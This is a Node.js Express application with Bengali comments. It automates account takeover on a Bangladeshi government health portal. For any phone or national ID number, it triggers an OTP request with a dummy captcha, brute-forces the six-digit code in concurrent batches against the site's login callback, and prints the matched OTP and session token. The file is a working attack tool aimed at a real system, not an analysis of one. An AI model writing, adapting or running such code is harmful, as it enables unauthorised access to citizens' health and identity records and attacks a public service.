const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

function generateSessionId() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// সিঙ্গেল ওটিপি ভেরিফিকেশন ফাংশন
async function verifyOtpRequest(phone, otp) {
    try {
        let csrfRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/csrf", {
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" },
            timeout: 5000
        });
        let csrfData = await csrfRes.json();
        let csrfToken = csrfData.csrfToken;
        
        let rawCookie = csrfRes.headers.get('set-cookie') || "";
        let cookieMatch = rawCookie.match(/__Host-next-auth\.csrf-token=([^;]+)/);
        let csrfCookie = cookieMatch ? cookieMatch[1] : "";

        if (!csrfToken) return false;

        let postData = new URLSearchParams({
            hid: phone,
            otp: otp,
            redirect: 'false',
            csrfToken: csrfToken,
            callbackUrl: 'https://amarswasthyo.mohfw.gov.bd/login',
            json: 'true'
        }).toString();

        let headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": `__Host-next-auth.csrf-token=${csrfCookie}`,
            "Origin": "https://amarswasthyo.mohfw.gov.bd",
            "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
        };

        let callbackRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/callback/credentials", {
            method: 'POST',
            headers: headers,
            body: postData,
            timeout: 5000
        });
        let cbData = await callbackRes.json();

        if (cbData.url === "https://amarswasthyo.mohfw.gov.bd/login") {
            let rawSessionCookie = callbackRes.headers.get('set-cookie') || "";
            let sessionMatch = rawSessionCookie.match(/__Secure-next-auth\.session-token=([^;]+)/);
            let sessionToken = sessionMatch ? sessionMatch[1] : "Found";
            return sessionToken;
        }
    } catch (e) {}
    return null;
}

app.get('/', async (req, res) => {
    let phoneOrNid = req.query.id;

    if (!phoneOrNid) {
        return res.send(`
            <h3>Usage Instructions:</h3>
            <p>Please provide the 'id' parameter in the URL.</p>
            <p><b>Example:</b> <a href="/?id=01700000000" target="_blank">/?id=01700000000</a></p>
        `);
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.write(`<h2>Processing for ID: ${phoneOrNid}</h2>`);
    res.write(`<p>Initializing Session and Sending OTP...</p>`);

    try {
        let sessionId = generateSessionId();
        let captchaUrl = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
        
        let capRes = await fetch(captchaUrl, {
            method: 'POST',
            headers: {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ sessionId: sessionId })
        });
        let capData = await capRes.json();
        if (capData.sessionId) sessionId = capData.sessionId;

        // অটো ওটিপি রিকোয়েস্ট (এখানে ডিফল্ট বাইপাস বা ডামি ক্যাপচা অ্যানসার পাঠানো হচ্ছে, প্রয়োজন অনুযায়ী পরিবর্তন করতে পারেন)
        let sendOtpUrl = "https://amarswasthyo.mohfw.gov.bd/api/requests/send-otp";
        let otpRes = await fetch(sendOtpUrl, {
            method: 'POST',
            headers: {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                captcha: "1234", // যদি ক্যাপচা প্রয়োজন হয়
                sessionId: sessionId,
                hid: phoneOrNid
            })
        });
        let otpJson = await otpRes.json();

        res.write(`<p>OTP Request Status: ${JSON.stringify(otpJson)}</p>`);
        res.write(`<p>Starting Superfast Brute-force / Auto Check...</p>`);

        // রেন্ডম ওটিপি জেনারেট করে চেক করা
        let otps = [];
        for(let i=0; i<10000; i++) {
            otps.push(String(Math.floor(Math.random() * 1000000)).padStart(6, '0'));
        }

        let batchSize = 50;
        let matchedOtp = null;
        let sessionToken = null;

        for (let i = 0; i < otps.length; i += batchSize) {
            let chunk = otps.slice(i, i + batchSize);
            
            let checks = chunk.map(async (otp) => {
                let token = await verifyOtpRequest(phoneOrNid, String(otp));
                return token ? { otp, token } : null;
            });

            let results = await Promise.all(checks);
            let found = results.find(r => r !== null);

            if (found) {
                matchedOtp = found.otp;
                sessionToken = found.token;
                break;
            }
        }

        if (matchedOtp) {
            res.write(`<h3 style="color: green;">Success! Matched OTP: ${matchedOtp}</h3>`);
            res.write(`<p>Session Token: ${sessionToken}</p>`);
        } else {
            res.write(`<h3 style="color: red;">Could not match automatically. Please try again.</h3>`);
        }
        res.end();

    } catch (err) {
        res.write(`<p style="color: red;">Error: ${err.message}</p>`);
        res.end();
    }
});

if (process.env.NODE_ENV !== 'production') {
    app.listen(3000, () => console.log('Server running on port 3000'));
}

module.exports = app;
